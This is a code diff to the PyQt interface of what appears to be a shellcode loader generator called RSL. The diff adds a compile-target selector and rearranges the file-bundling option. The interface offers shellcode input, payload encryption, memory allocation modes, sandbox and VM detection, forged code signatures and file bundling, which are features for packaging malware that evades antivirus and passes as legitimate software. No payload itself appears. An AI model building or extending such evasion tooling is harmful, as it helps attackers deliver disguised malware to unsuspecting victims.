@@ -20,7 +20,8 @@ from .ui_components import (
     create_encryption_combobox,
     create_mem_mode_combobox,
     create_vm_checks_grid,
-    create_run_mode_combobox
+    create_run_mode_combobox,
+    create_target_combobox
 )
 class LoaderGUI(QWidget):
     """RSL加载器主窗口"""
@@ -82,7 +83,7 @@ class LoaderGUI(QWidget):
     
     def _create_bin_group(self, folder_icon):
         """创建shellcode输入组"""
-        bin_group = QGroupBox('shellcode')
+        bin_group = QGroupBox('Shellcode')
         bin_layout = QHBoxLayout()
         self.bin_box = BinComboBox()
         bin_btn = QPushButton(folder_icon, '')
@@ -96,7 +97,7 @@ class LoaderGUI(QWidget):
     
     def _create_encryption_group(self):
         """创建加密方式组"""
-        enc_group = QGroupBox('🔒 加密方式')
+        enc_group = QGroupBox('加密方式')
         enc_layout = QHBoxLayout()
         self.enc_box = create_encryption_combobox()
         enc_layout.addWidget(self.enc_box)
@@ -105,7 +106,7 @@ class LoaderGUI(QWidget):
     
     def _create_icon_group(self, folder_icon):
         """创建图标选择组"""
-        ico_group = QGroupBox('🖼️ 图标文件')
+        ico_group = QGroupBox('图标文件')
         ico_layout = QHBoxLayout()
         self.ico_box = IcoComboBox()
         ico_btn = QPushButton(folder_icon, '')
@@ -119,7 +120,7 @@ class LoaderGUI(QWidget):
     
     def _create_mem_mode_group(self):
         """创建内存分配方式组"""
-        mem_group = QGroupBox('🧠 内存分配方式')
+        mem_group = QGroupBox('内存分配方式')
         mem_layout = QHBoxLayout()
         self.mem_mode_box = create_mem_mode_combobox()
         mem_layout.addWidget(self.mem_mode_box)
@@ -128,7 +129,7 @@ class LoaderGUI(QWidget):
     
     def _create_vm_checks_group(self):
         """创建VM检测组"""
-        vm_group = QGroupBox('🛡️ Sandbox 检测')
+        vm_group = QGroupBox('Sandbox 检测')
         vm_layout = QVBoxLayout()
         self.vm_checks_group = QGroupBox('')
         self.vm_checks_group.setVisible(True)
@@ -140,7 +141,7 @@ class LoaderGUI(QWidget):
     
     def _create_run_mode_group(self):
         """创建运行方式组"""
-        run_group = QGroupBox('🚀 运行方式')
+        run_group = QGroupBox('运行方式')
         run_layout = QHBoxLayout()
         self.run_mode_box = create_run_mode_combobox()
         run_layout.addWidget(self.run_mode_box)
@@ -149,7 +150,7 @@ class LoaderGUI(QWidget):
     
     def _create_sign_group(self, folder_icon):
         """创建伪造签名组"""
-        sign_group = QGroupBox('🔏 伪造签名')
+        sign_group = QGroupBox('伪造签名')
         sign_layout = QHBoxLayout()
         self.sign_app_box = SignAppComboBox()
         self.sign_choose_btn = QPushButton(folder_icon, '')
@@ -157,12 +158,15 @@ class LoaderGUI(QWidget):
         self.sign_choose_btn.setFixedWidth(32)
         self.sign_choose_btn.clicked.connect(lambda: self.sign_app_box.choose_file(self))
         self.sign_enable_box = QCheckBox('启用签名')
+        self.forgery_enable_box = QCheckBox('文件捆绑')
         sign_layout.addWidget(self.sign_app_box)
         sign_layout.addWidget(self.sign_choose_btn)
         sign_layout.addWidget(self.sign_enable_box)
+        sign_layout.addWidget(self.forgery_enable_box)
         sign_layout.setStretch(0, 1)
         sign_layout.setStretch(1, 0)
         sign_layout.setStretch(2, 0)
+        sign_layout.setStretch(3, 0)
         sign_group.setLayout(sign_layout)
         return sign_group
     
@@ -178,17 +182,20 @@ class LoaderGUI(QWidget):
         log_layout.addWidget(self.log)
         log_group.setLayout(log_layout)
         
-        # 右侧布局：文件捆绑 + 生成按钮
+        # 右侧布局：编译目标 + 生成按钮
         right_layout = QVBoxLayout()
-        self.forgery_enable_box = QCheckBox('🎭 文件捆绑')
         
-        # 按钮改为正方形，无文字，只显示图标
+        fixed_height = 230
+        
+        # 编译目标选择
+        self.target_box = create_target_combobox()
+        self.target_box.setFixedWidth(fixed_height)
+        
         self.gen_btn = QPushButton(QIcon(os.path.join('gui', 'icons', 'rocket.ico')), '')
         self.gen_btn.setIconSize(QSize(100, 100))
-        fixed_height = 150
         self.gen_btn.setFixedSize(fixed_height, fixed_height)
         
-        right_layout.addWidget(self.forgery_enable_box)
+        right_layout.addWidget(self.target_box)
         right_layout.addWidget(self.gen_btn)
         
         self.gen_btn.clicked.connect(self.run_all)
@@ -254,6 +261,10 @@ class LoaderGUI(QWidget):
         if not mem_mode:
             mem_mode = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
         
+        target = self.target_box.itemData(self.target_box.currentIndex())
+        if not target:
+            target = self.target_box.currentText()
+        
         return {
             'input_bin': input_bin,
             'run_mode': run_mode,
@@ -263,7 +274,8 @@ class LoaderGUI(QWidget):
             'sign_enable': sign_enable,
             'sign_app': sign_app,
             'forgery_enable': forgery_enable,
-            'mem_mode': mem_mode
+            'mem_mode': mem_mode,
+            'target': target
         }
     
     def on_gen_error(self, msg):
